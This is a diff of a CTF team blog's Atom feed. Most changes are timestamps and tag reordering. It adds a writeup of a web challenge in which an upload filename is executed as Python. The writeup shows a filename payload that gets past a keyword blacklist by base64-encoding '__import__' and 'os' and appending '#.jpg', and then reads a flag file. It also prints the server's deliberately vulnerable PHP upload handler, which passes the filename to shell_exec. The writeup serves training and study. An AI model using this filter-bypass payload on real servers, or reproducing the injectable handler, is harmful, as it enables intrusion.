@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://teamrocketist.github.io/"/>
-  <updated>2017-12-30T00:15:08.428Z</updated>
+  <updated>2018-10-08T01:04:39.680Z</updated>
   <id>https://teamrocketist.github.io/</id>
   
   <author>
@@ -16,11 +16,57 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>[Web] InCTF 2018 - The Most Secure File Uploader</title>
+    <link href="https://teamrocketist.github.io/2018/10/08/Web-InCTF-2018-The-Most-Secure-File-Uploader/"/>
+    <id>https://teamrocketist.github.io/2018/10/08/Web-InCTF-2018-The-Most-Secure-File-Uploader/</id>
+    <published>2018-10-08T00:09:56.000Z</published>
+    <updated>2018-10-08T01:04:39.680Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><br>The Most Secure File Uploader<br>100<br><br>======= Difficulty level : Medium ========<br><br>Somehow the codes are all messed up and it seems that it was my younger brother. He messed up my File Uploader. But I know you…You dont look like a hacker at all…Can you fix this for me? :)<br><br><img src="http://18.216.190.57/" alt="link"><br><br>========== Authors : c3rb3ru5, Nimisha, SpyD3r ==========<br><br></blockquote>
+
+<p>After a long pause we are happy to anounce that we are doing CTFs again so more write ups comming soon this month :). </p>
+<p>Starting with something simple we have a web challenge where it’s hinted that we probably need to upload something malicious to the server, for the begining I decided to upload a random image without nothing special:<br><a data-fancybox="gallery" href="https://i.imgur.com/SIdVAKj.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/SIdVAKj.png" alt=""><br></a></p>
+<p>And we can already see something interesting, we have a traceback error and we can easily identify it as being from python, the file name is being executed as python code, after some testing I noticed that alot of words were blacklisted:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">blacklisted = <span class="string">r"import|os|class|subclasses|mro|request|args|eval|if|for|\%|subprocess|file|open|popen|builtins|\+|compile|execfile|from_pyfile|config|local|\`|\||\&amp;|\;|\&#123;|\&#125;"</span></div></pre></td></tr></table></figure>
+<p>As we know blacklisting is always a bad pratice after testing for a while I noticed that <strong><em>globals()</em></strong> wasn’t being blocked and from globals we can easily can get the builtin function from python :</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ python -c <span class="string">"print globals()"</span></div><div class="line">&#123;<span class="string">'__builtins__'</span>: &lt;module <span class="string">'__builtin__'</span> (built-in)&gt;, <span class="string">'__name__'</span>: <span class="string">'__main__'</span>, <span class="string">'__doc__'</span>: None, <span class="string">'__package__'</span>: None&#125;</div><div class="line">$ python -c <span class="string">"print globals().values()[0]"</span></div><div class="line">&lt;module <span class="string">'__builtin__'</span> (built-in)&gt;</div><div class="line">$ python -c <span class="string">"print dir(globals().values()[0])"</span></div><div class="line">[<span class="string">'ArithmeticError'</span>, <span class="string">'AssertionError'</span>, <span class="string">'AttributeError'</span>, <span class="string">'BaseException'</span>, <span class="string">'BufferError'</span>, <span class="string">'BytesWarning'</span>, <span class="string">'DeprecationWarning'</span>, <span class="string">'EOFError'</span>, <span class="string">'Ellipsis'</span>, <span class="string">'EnvironmentError'</span>, <span class="string">'Exception'</span>, <span class="string">'False'</span>, <span class="string">'FloatingPointError'</span>, <span class="string">'FutureWarning'</span>, <span class="string">'GeneratorExit'</span>, <span class="string">'IOError'</span>, <span class="string">'ImportError'</span>, <span class="string">'ImportWarning'</span>, <span class="string">'IndentationError'</span>, <span class="string">'IndexError'</span>, <span class="string">'KeyError'</span>, <span class="string">'KeyboardInterrupt'</span>, <span class="string">'LookupError'</span>, <span class="string">'MemoryError'</span>, <span class="string">'NameError'</span>, <span class="string">'None'</span>, <span class="string">'NotImplemented'</span>, <span class="string">'NotImplementedError'</span>, <span class="string">'OSError'</span>, <span class="string">'OverflowError'</span>, <span class="string">'PendingDeprecationWarning'</span>, <span class="string">'ReferenceError'</span>, <span class="string">'RuntimeError'</span>, <span class="string">'RuntimeWarning'</span>, <span class="string">'StandardError'</span>, <span class="string">'StopIteration'</span>, <span class="string">'SyntaxError'</span>, <span class="string">'SyntaxWarning'</span>, <span class="string">'SystemError'</span>, <span class="string">'SystemExit'</span>, <span class="string">'TabError'</span>, <span class="string">'True'</span>, <span class="string">'TypeError'</span>, <span class="string">'UnboundLocalError'</span>, <span class="string">'UnicodeDecodeError'</span>, <span class="string">'UnicodeEncodeError'</span>, <span class="string">'UnicodeError'</span>, <span class="string">'UnicodeTranslateError'</span>, <span class="string">'UnicodeWarning'</span>, <span class="string">'UserWarning'</span>, <span class="string">'ValueError'</span>, <span class="string">'Warning'</span>, <span class="string">'ZeroDivisionError'</span>, <span class="string">'__debug__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__import__'</span>, <span class="string">'__name__'</span>, <span class="string">'__package__'</span>, <span class="string">'abs'</span>, <span class="string">'all'</span>, <span class="string">'any'</span>, <span class="string">'apply'</span>, <span class="string">'basestring'</span>, <span class="string">'bin'</span>, <span class="string">'bool'</span>, <span class="string">'buffer'</span>, <span class="string">'bytearray'</span>, <span class="string">'bytes'</span>, <span class="string">'callable'</span>, <span class="string">'chr'</span>, <span class="string">'classmethod'</span>, <span class="string">'cmp'</span>, <span class="string">'coerce'</span>, <span class="string">'compile'</span>, <span class="string">'complex'</span>, <span class="string">'copyright'</span>, <span class="string">'credits'</span>, <span class="string">'delattr'</span>, <span class="string">'dict'</span>, <span class="string">'dir'</span>, <span class="string">'divmod'</span>, <span class="string">'enumerate'</span>, <span class="string">'eval'</span>, <span class="string">'execfile'</span>, <span class="string">'exit'</span>, <span class="string">'file'</span>, <span class="string">'filter'</span>, <span class="string">'float'</span>, <span class="string">'format'</span>, <span class="string">'frozenset'</span>, <span class="string">'getattr'</span>, <span class="string">'globals'</span>, <span class="string">'hasattr'</span>, <span class="string">'hash'</span>, <span class="string">'help'</span>, <span class="string">'hex'</span>, <span class="string">'id'</span>, <span class="string">'input'</span>, <span class="string">'int'</span>, <span class="string">'intern'</span>, <span class="string">'isinstance'</span>, <span class="string">'issubclass'</span>, <span class="string">'iter'</span>, <span class="string">'len'</span>, <span class="string">'license'</span>, <span class="string">'list'</span>, <span class="string">'locals'</span>, <span class="string">'long'</span>, <span class="string">'map'</span>, <span class="string">'max'</span>, <span class="string">'memoryview'</span>, <span class="string">'min'</span>, <span class="string">'next'</span>, <span class="string">'object'</span>, <span class="string">'oct'</span>, <span class="string">'open'</span>, <span class="string">'ord'</span>, <span class="string">'pow'</span>, <span class="string">'print'</span>, <span class="string">'property'</span>, <span class="string">'quit'</span>, <span class="string">'range'</span>, <span class="string">'raw_input'</span>, <span class="string">'reduce'</span>, <span class="string">'reload'</span>, <span class="string">'repr'</span>, <span class="string">'reversed'</span>, <span class="string">'round'</span>, <span class="string">'set'</span>, <span class="string">'setattr'</span>, <span class="string">'slice'</span>, <span class="string">'sorted'</span>, <span class="string">'staticmethod'</span>, <span class="string">'str'</span>, <span class="string">'sum'</span>, <span class="string">'super'</span>, <span class="string">'tuple'</span>, <span class="string">'type'</span>, <span class="string">'unichr'</span>, <span class="string">'unicode'</span>, <span class="string">'vars'</span>, <span class="string">'xrange'</span>, <span class="string">'zip'</span>]</div></pre></td></tr></table></figure>
+<p>But we run into a problem now alot of words are blacklisted and there is an interesting builtin function we can use to list the files in the current directory <img src="https://www.tutorialspoint.com/python/os_listdir.htm" alt="os.listdir">, the problem is both import and os keywords are blacklisted so how do we bypass this? My solution was to find a way to execute function and import modules (<strong>dict</strong>[‘function’]) with strings and why strings? Because we can bypass this keywords by just using some kind of enconding in my case I choosed to use base64:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ python -c <span class="string">"print globals().values()[0].__dict__['__import__']('os')"</span> <span class="comment"># gets caught by the filter</span></div><div class="line">&lt;module <span class="string">'os'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/os.pyc'</span>&gt;</div><div class="line"></div><div class="line">python -c <span class="string">"print globals().values()[0].__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64'))"</span> <span class="comment">#bypasses the filter</span></div><div class="line">&lt;module <span class="string">'os'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/os.pyc'</span>&gt;</div></pre></td></tr></table></figure>
+<p>Another thing we need to worry about is about the extension of the file, the filename needs to end in a valid image format like <strong><em>.jpg</em></strong>, this will cause an error because python methods don’t have a valid attribute named .jpg for example but we can easily bypass this by using a python comment #.jpg:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">python -c <span class="string">"print globals().values()[0].__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64'))#.jpg"</span> </div><div class="line">&lt;module <span class="string">'os'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/os.pyc'</span>&gt;</div></pre></td></tr></table></figure>
+<p>Now if we want to list the current directory with <strong><em>os.listdir(‘.’)</em></strong> we just need to complete our script:</p>
+<p><a data-fancybox="gallery" href="https://i.imgur.com/af3eq5s.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/af3eq5s.png" alt=""><br></a></p>
+<p>We now know that there is a file with the name of flag we just need to read it with open and read() :</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">print</span> globals().values()[<span class="number">0</span>].__dict__[<span class="string">'open'</span>](<span class="string">'flag'</span>,<span class="string">'r'</span>).read()<span class="comment">#.jpg</span></div><div class="line"><span class="keyword">print</span> globals().values()[<span class="number">0</span>].__dict__[<span class="string">'b3Blbg=='</span>.decode(<span class="string">'base64'</span>)](<span class="string">'flag'</span>,<span class="string">'r'</span>).read()<span class="comment">#.jpg</span></div></pre></td></tr></table></figure>
+<p><a data-fancybox="gallery" href="https://i.imgur.com/9DHTSlo.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/9DHTSlo.png" alt=""><br></a></p>
+<p>And there it was the flag, and I managed to get the source code of the php file so here is an extra:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$target_dir = <span class="string">"uploads/"</span>;</div><div class="line">$target_file = $target_dir . basename($_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>]);</div><div class="line">$uploadOk = <span class="number">1</span>;</div><div class="line">$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));</div><div class="line"></div><div class="line">$blacklist = <span class="string">"import|os|class|subclasses|mro|request|args|eval|if|for|\%|subprocess|file|open|popen|builtins|\+|compile|execfile|from_pyfile|config|local|\`|\||\&amp;|\;|\&#123;|\&#125;"</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!$_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>])</div><div class="line">&#123;</div><div class="line">	<span class="keyword">die</span>(<span class="string">"PLEASE UPLOAD SOMETHING"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Check if image file is a actual image or fake image</span></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>])) &#123;</div><div class="line">    $check = getimagesize($_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"tmp_name"</span>]);</div><div class="line">    <span class="keyword">if</span>($check !== <span class="keyword">false</span>) &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"File is an image - "</span> . $check[<span class="string">"mime"</span>] . <span class="string">"&lt;br--&gt;"</span>;</div><div class="line">        $uploadOk = <span class="number">1</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"File is not an image."</span> . <span class="string">"&lt;br&gt;"</span>;</div><div class="line">        $uploadOk = <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Check file size</span></div><div class="line"><span class="keyword">if</span> ($_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"size"</span>] &gt; <span class="number">500000</span>) &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"Sorry, your file is too large."</span> . <span class="string">"&lt;br&gt;"</span>;</div><div class="line">    $uploadOk = <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Allow certain file formats</span></div><div class="line"><span class="keyword">if</span>($imageFileType != <span class="string">"jpg"</span> &amp;&amp; $imageFileType &amp;&amp; <span class="string">"png"</span> &amp;&amp; $imageFileType != <span class="string">"jpeg"</span></div><div class="line">&amp;&amp; $imageFileType != <span class="string">"gif"</span> ) &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"Sorry, only JPG, JPEG, PNG &amp; GIF files are allowed."</span> . <span class="string">"&lt;br&gt;"</span>;</div><div class="line">    $uploadOk = <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Check if $uploadOk is set to 0 by an error</span></div><div class="line"><span class="keyword">if</span> ($uploadOk == <span class="number">0</span>) &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"Sorry, your file was not uploaded."</span> . <span class="string">"&lt;br&gt;"</span>;</div><div class="line">    <span class="keyword">exit</span>();</div><div class="line">&#125;</div><div class="line"><span class="comment">// if everything is ok, try to upload file</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/$blacklist/i"</span>, $_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>]))&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;Filename: "</span>.$_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>].<span class="string">"&lt;br&gt;&lt;br&gt;"</span>;</div><div class="line">    <span class="keyword">die</span>(<span class="string">"I think its called blacklisting...!"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">echo</span> <span class="string">"The file: "</span>. basename( $_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>]). <span class="string">" has been uploaded."</span> . <span class="string">"&lt;br&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">"File: "</span> . $_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>] . <span class="string">"&lt;br&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">"Size: "</span> . $_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"size"</span>] . <span class="string">"&lt;br&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">"Type: "</span> . $_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"type"</span>] . <span class="string">"&lt;br&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> $name = urldecode($_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>]);</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> shell_exec(<span class="string">"python -c \""</span> . $name . <span class="string">"\" 2&gt;&amp;1"</span>);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;blockquote&gt;&lt;br&gt;The Most Secure File Uploader&lt;br&gt;100&lt;br&gt;&lt;br&gt;======= Difficulty level : Medium ========&lt;br&gt;&lt;br&gt;Somehow the codes are all mess
+    
+    </summary>
+    
+      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
+    
+    
+      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
+    
+      <category term="pyjail" scheme="https://teamrocketist.github.io/tags/pyjail/"/>
+    
+      <category term="python_sandbox" scheme="https://teamrocketist.github.io/tags/python-sandbox/"/>
+    
+      <category term="InCTF2018" scheme="https://teamrocketist.github.io/tags/InCTF2018/"/>
+    
+  </entry>
+  
+  <entry>
     <title>[Reverse] 34C3ctf - m0rph</title>
     <link href="https://teamrocketist.github.io/2017/12/30/Reverse-34C3ctf-m0rph/"/>
     <id>https://teamrocketist.github.io/2017/12/30/Reverse-34C3ctf-m0rph/</id>
     <published>2017-12-30T00:07:22.000Z</published>
-    <updated>2017-12-30T00:15:08.428Z</updated>
+    <updated>2017-12-30T00:15:08.429Z</updated>
     
     <content type="html"><![CDATA[<blockquote><br>m0rph 49 Solves: 163<br><br>To get you started :)<br><br>files: Link<br><br>difficulty: easy<br><br></blockquote>
 
@@ -66,7 +112,7 @@
     <link href="https://teamrocketist.github.io/2017/12/19/Reverse-3DS-IRC-Bot-Takeover/"/>
     <id>https://teamrocketist.github.io/2017/12/19/Reverse-3DS-IRC-Bot-Takeover/</id>
     <published>2017-12-19T22:09:52.000Z</published>
-    <updated>2017-12-19T22:34:27.085Z</updated>
+    <updated>2017-12-19T22:34:27.086Z</updated>
     
     <content type="html"><![CDATA[<blockquote><br>IRC Bot Takeover - 486 Points<br><br>WARNING! DON’T EXECUTE THIS SAMPLE IN YOUR OWN PERSONAL MACHINE!!!<br><br><br>Update: We had some problems with a specific step of the challenge (still possible to solve, but more hard) and we updated the binary. The new file has the old version, but you only need the new to solve.<br></blockquote>
 
@@ -97,9 +143,9 @@
     
       <category term="xor" scheme="https://teamrocketist.github.io/tags/xor/"/>
     
-      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
-    
       <category term="malware" scheme="https://teamrocketist.github.io/tags/malware/"/>
+    
+      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
     
       <category term="3DS2017" scheme="https://teamrocketist.github.io/tags/3DS2017/"/>
     
@@ -142,9 +188,9 @@
     
       <category term="xor" scheme="https://teamrocketist.github.io/tags/xor/"/>
     
-      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
-    
       <category term="malware" scheme="https://teamrocketist.github.io/tags/malware/"/>
+    
+      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
     
       <category term="3DS2017" scheme="https://teamrocketist.github.io/tags/3DS2017/"/>
     
@@ -155,7 +201,7 @@
     <link href="https://teamrocketist.github.io/2017/12/18/Reverse-3DS-Ransomware/"/>
     <id>https://teamrocketist.github.io/2017/12/18/Reverse-3DS-Ransomware/</id>
     <published>2017-12-18T19:45:33.000Z</published>
-    <updated>2017-12-18T20:24:15.892Z</updated>
+    <updated>2017-12-18T20:24:15.893Z</updated>
     
     <content type="html"><![CDATA[<blockquote><br>Ransomware - 464 Points<br>WARNING! DON’T EXECUTE THIS SAMPLE IN YOUR OWN PERSONAL MACHINE!!!<br></blockquote>
 
@@ -203,9 +249,9 @@
     
       <category term="xor" scheme="https://teamrocketist.github.io/tags/xor/"/>
     
-      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
-    
       <category term="malware" scheme="https://teamrocketist.github.io/tags/malware/"/>
+    
+      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
     
       <category term="3DS2017" scheme="https://teamrocketist.github.io/tags/3DS2017/"/>
     
@@ -218,7 +264,7 @@
     <link href="https://teamrocketist.github.io/2017/12/18/Reverse-3DS-Scared-Flag/"/>
     <id>https://teamrocketist.github.io/2017/12/18/Reverse-3DS-Scared-Flag/</id>
     <published>2017-12-18T03:58:03.000Z</published>
-    <updated>2017-12-18T04:19:37.571Z</updated>
+    <updated>2017-12-18T04:19:37.572Z</updated>
     
     <content type="html"><![CDATA[<blockquote><br>Scared Flag - 479 Points<br><br>ヽ(ﾟДﾟ)ﾉ<br></blockquote>
 
@@ -243,9 +289,9 @@
       <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
     
     
-      <category term="radare2" scheme="https://teamrocketist.github.io/tags/radare2/"/>
-    
       <category term="3DS2017" scheme="https://teamrocketist.github.io/tags/3DS2017/"/>
+    
+      <category term="radare2" scheme="https://teamrocketist.github.io/tags/radare2/"/>
     
       <category term="intel_hex" scheme="https://teamrocketist.github.io/tags/intel-hex/"/>
     
@@ -258,7 +304,7 @@
     <link href="https://teamrocketist.github.io/2017/12/13/Pwn-SECCON-Baby-Stack/"/>
     <id>https://teamrocketist.github.io/2017/12/13/Pwn-SECCON-Baby-Stack/</id>
     <published>2017-12-13T04:05:45.000Z</published>
-    <updated>2017-12-14T17:28:20.817Z</updated>
+    <updated>2017-12-14T17:28:20.818Z</updated>
     
     <content type="html"><![CDATA[<blockquote><br>Baby Stack<br><br>Can you do a traditional stack attack?<br><br>Host : baby_stack.pwn.seccon.jp<br>Port : 15285<br>baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8<br></blockquote>
 
@@ -316,9 +362,9 @@
     
       <category term="rop" scheme="https://teamrocketist.github.io/tags/rop/"/>
     
-      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
-    
       <category term="stack_overflow" scheme="https://teamrocketist.github.io/tags/stack-overflow/"/>
+    
+      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
     
       <category term="go" scheme="https://teamrocketist.github.io/tags/go/"/>
     
@@ -376,7 +422,7 @@
     <link href="https://teamrocketist.github.io/2017/12/04/Reverse-TPCTF2017-Bad-Encryption/"/>
     <id>https://teamrocketist.github.io/2017/12/04/Reverse-TPCTF2017-Bad-Encryption/</id>
     <published>2017-12-04T06:06:23.000Z</published>
-    <updated>2017-12-04T06:18:01.700Z</updated>
+    <updated>2017-12-04T06:18:01.701Z</updated>
     
     <content type="html"><![CDATA[<blockquote><br>Bad Encryption<br>100<br><br>I was making an encryption program, but it is far from perfect. Instead of make the encryption work, I decided to just encrypt everything 100 times.<br><br>Author: Kevin Higgs<br><br></blockquote>
 
@@ -407,9 +453,9 @@
     
       <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
     
-      <category term="tpctf2017" scheme="https://teamrocketist.github.io/tags/tpctf2017/"/>
-    
       <category term="bytebybyte" scheme="https://teamrocketist.github.io/tags/bytebybyte/"/>
+    
+      <category term="tpctf2017" scheme="https://teamrocketist.github.io/tags/tpctf2017/"/>
     
       <category term="python3" scheme="https://teamrocketist.github.io/tags/python3/"/>
     
@@ -497,7 +543,7 @@
     <link href="https://teamrocketist.github.io/2017/12/01/Misc-TUCTF-Gr8-Pictures/"/>
     <id>https://teamrocketist.github.io/2017/12/01/Misc-TUCTF-Gr8-Pictures/</id>
     <published>2017-12-01T07:58:48.000Z</published>
-    <updated>2017-12-01T12:03:55.939Z</updated>
+    <updated>2017-12-01T12:03:55.940Z</updated>
     
     <content type="html"><![CDATA[<blockquote><br>Gr8 Pictures<br>50<br><br>The mysterious hacker 4chan is believed to be passing secret messages hidden in a picture. We know that he connects to gr8pics.tuctf.com:4444 to hide his message in the picture. Your mission, should you choose to accept it, is to find out what message he is trying to hide.<br><br>nc gr8pics.tuctf.com 4444<br>If you get connection refused, use nc gr8pics.tuctf.com 41234<br>NOTE: the server does not show a prompt, but if the connection is successful, you are at the correct starting point.<br>NOTE: without connecting to the server, the flag is theoretically cryptographically impossible to get<br>NOTE: If you’re getting a bunch of data that doesn’t seem to stop - it stops after ~3MB of data<br><br>sha1<br>9044fe96a50ecb831fe451f13c24cc96b0a9e24d flag.png<br><br></blockquote>
 
@@ -556,9 +602,9 @@
     
       <category term="radare2" scheme="https://teamrocketist.github.io/tags/radare2/"/>
     
-      <category term="bytebybyte" scheme="https://teamrocketist.github.io/tags/bytebybyte/"/>
-    
       <category term="r2script" scheme="https://teamrocketist.github.io/tags/r2script/"/>
+    
+      <category term="bytebybyte" scheme="https://teamrocketist.github.io/tags/bytebybyte/"/>
     
       <category term="tuctf2017" scheme="https://teamrocketist.github.io/tags/tuctf2017/"/>
     
@@ -569,7 +615,7 @@
     <link href="https://teamrocketist.github.io/2017/10/28/Electronics-Pwn2Win-Top-Secret/"/>
     <id>https://teamrocketist.github.io/2017/10/28/Electronics-Pwn2Win-Top-Secret/</id>
     <published>2017-10-28T15:25:56.000Z</published>
-    <updated>2017-10-28T15:50:44.445Z</updated>
+    <updated>2017-10-28T15:50:44.446Z</updated>
     
     <content type="html"><![CDATA[<blockquote><br>Top Secret<br><br>Molly was able to take pictures of a strange digital circuit sketch, along with an also strange message. All of these things were inside an envelope in a safe, which was labeled “Top Secret”.<br><br>We believe it might contain Butcher Corp’s plans for the future, can you help us read the message?<br><br>Link<br><br>Mirror<br><br>Id: top_secret<br><br>Total solves: 40<br><br>Score: 223<br><br>Categories: Eletronics<br></blockquote>
 
@@ -612,7 +658,7 @@
     <link href="https://teamrocketist.github.io/2017/10/24/Web-Pwn2Win-Criminals/"/>
     <id>https://teamrocketist.github.io/2017/10/24/Web-Pwn2Win-Criminals/</id>
     <published>2017-10-24T06:53:16.000Z</published>
-    <updated>2017-10-24T06:59:23.807Z</updated>
+    <updated>2017-10-24T06:59:23.808Z</updated>
     
     <content type="html"><![CDATA[<blockquote><br>Criminals<br><br>Hey, Rebellious member, let’s hack this Bloodsuckers web app. I think they keep some secret.<br><br><a href="http://200.136.213.109/" target="_blank" rel="external">http://200.136.213.109/</a><br><br>Automated tools are NOT required and NOT allowed.<br><br>Id: criminals<br><br>Total solves: 9<br><br>Score: 363<br><br>Categories: Web<br></blockquote>
 
@@ -738,9 +784,9 @@ array_upper(xpath (<span class="string">'row'</span>, query_to_xml (<span class=
     
       <category term="rop" scheme="https://teamrocketist.github.io/tags/rop/"/>
     
-      <category term="ret2libc" scheme="https://teamrocketist.github.io/tags/ret2libc/"/>
-    
       <category term="stack_overflow" scheme="https://teamrocketist.github.io/tags/stack-overflow/"/>
+    
+      <category term="ret2libc" scheme="https://teamrocketist.github.io/tags/ret2libc/"/>
     
   </entry>
   
@@ -749,7 +795,7 @@ array_upper(xpath (<span class="string">'row'</span>, query_to_xml (<span class=
     <link href="https://teamrocketist.github.io/2017/10/22/Pwn-Pwn2Win-Hidden-Program-Warmup/"/>
     <id>https://teamrocketist.github.io/2017/10/22/Pwn-Pwn2Win-Hidden-Program-Warmup/</id>
     <published>2017-10-22T20:42:32.000Z</published>
-    <updated>2017-10-22T20:44:33.928Z</updated>
+    <updated>2017-10-22T20:44:33.929Z</updated>
     
     <content type="html"><![CDATA[<blockquote><br>Hidden Program (Warmup)<br><br>Molly found this program hidden on her chip, can you help her to understand it?<br><br>Link:<br><a href="https://cloud.ufscar.br:8080/v1/AUTH_c93b694078064b4f81afd2266a502511/static.pwn2win.party/hiddenprogram_d502a4418484effac415ffb57dfd658b1123dd530fd01714755958bd4b8c1289.tar.gz" target="_blank" rel="external">https://cloud.ufscar.br:8080/v1/AUTH_c93b694078064b4f81afd2266a502511/static.pwn2win.party/hiddenprogram_d502a4418484effac415ffb57dfd658b1123dd530fd01714755958bd4b8c1289.tar.gz</a><br><br>Mirror:<br><a href="https://static.pwn2win.party/hiddenprogram_d502a4418484effac415ffb57dfd658b1123dd530fd01714755958bd4b8c1289.tar.gz" target="_blank" rel="external">https://static.pwn2win.party/hiddenprogram_d502a4418484effac415ffb57dfd658b1123dd530fd01714755958bd4b8c1289.tar.gz</a><br><br>Server: nc 200.136.213.126 1988<br><br>Id: hidden_program<br><br>Total solves: 145<br><br>Score: 82<br><br>Categories: Exploitation<br></blockquote>
 
@@ -865,7 +911,7 @@ array_upper(xpath (<span class="string">'row'</span>, query_to_xml (<span class=
     <link href="https://teamrocketist.github.io/2017/10/22/Crypto-Pwn2Win-2017-Differential-Privacy/"/>
     <id>https://teamrocketist.github.io/2017/10/22/Crypto-Pwn2Win-2017-Differential-Privacy/</id>
     <published>2017-10-22T18:59:47.000Z</published>
-    <updated>2017-10-24T08:02:37.848Z</updated>
+    <updated>2017-10-24T08:02:37.849Z</updated>
     
     <content type="html"><![CDATA[<blockquote><br>Differential Privacy<br><br>Is it possible to have privacy on these days? The Rebelious Fingers do not think so. Get the flag.<br><br>Server: nc 200.136.213.143 9999<br><br></blockquote>
 
@@ -1001,43 +1047,6 @@ d = []
       <category term="sandbox" scheme="https://teamrocketist.github.io/tags/sandbox/"/>
     
       <category term="regex" scheme="https://teamrocketist.github.io/tags/regex/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>[Forensics] Square CTF - Sniffed Off the Wire</title>
-    <link href="https://teamrocketist.github.io/2017/10/16/Forensics-Square-CTF-Sniffed-Off-the-Wire/"/>
